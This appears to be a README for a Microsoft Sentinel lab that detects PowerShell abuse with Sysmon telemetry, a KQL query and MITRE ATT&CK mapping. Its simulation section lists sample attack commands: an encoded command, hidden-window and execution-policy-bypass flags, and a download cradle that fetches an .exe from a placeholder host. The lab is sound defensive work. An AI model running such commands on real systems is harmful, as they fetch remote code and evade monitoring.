# ⚡ PowerShell Abuse Detection – Microsoft Sentinel

🚀 Hands-on detection engineering lab focused on identifying suspicious PowerShell activity using Sysmon telemetry and Microsoft Sentinel.

---

## 🎯 What This Lab Demonstrates

- PowerShell telemetry monitoring
- Detection engineering with KQL
- Encoded PowerShell detection
- Hidden PowerShell execution detection
- Download cradle detection
- Analytics rule creation
- Incident generation in Sentinel
- MITRE ATT&CK mapping

---

## 🧰 Technologies Used

- Microsoft Sentinel
- Sysmon
- Azure Arc
- Azure Monitor Agent (AMA)
- KQL (Kusto Query Language)
- Windows 11 VM
- VirtualBox

---

## 🏗️ Lab Architecture

Windows 11 VM
        ↓
Sysmon Telemetry
        ↓
Azure Monitor Agent
        ↓
Azure Arc
        ↓
Log Analytics Workspace
        ↓
Microsoft Sentinel

---

## 🧪 Attack Simulation

The following suspicious PowerShell techniques were simulated:

### Encoded PowerShell

```powershell
powershell.exe -EncodedCommand ZQBjAGgAbwAgAEgAZQBsAGwAbwA=

Hidden PowerShell
powershell.exe -WindowStyle Hidden
Execution Policy Bypass
powershell.exe -ExecutionPolicy Bypass
Non-Interactive PowerShell
powershell.exe -NoProfile -NonInteractive
Download Cradle Simulation
powershell.exe Invoke-WebRequest http://example.com/file.exe
🔍 Detection Query
Event
| where Source == "Microsoft-Windows-Sysmon"
| where EventID == 1
| where RenderedDescription contains "powershell"
| where RenderedDescription contains "-EncodedCommand"
    or RenderedDescription contains "-WindowStyle Hidden"
    or RenderedDescription contains "Invoke-WebRequest"
    or RenderedDescription contains "ExecutionPolicy Bypass"
    or RenderedDescription contains "-NonInteractive"
🚨 Analytics Rule

A Scheduled Analytics Rule named:

Suspicious PowerShell Activity was created in Microsoft Sentinel to automatically generate incidents when suspicious PowerShell activity is detected.

🧠 MITRE ATT&CK Mapping
Tactic	Technique	ID
Execution	PowerShell	T1059.001
Defense Evasion	Obfuscated Files or Information	T1027
Defense Evasion	Hide Artifacts	T1564
Command and Control	Ingress Tool Transfer	T1105

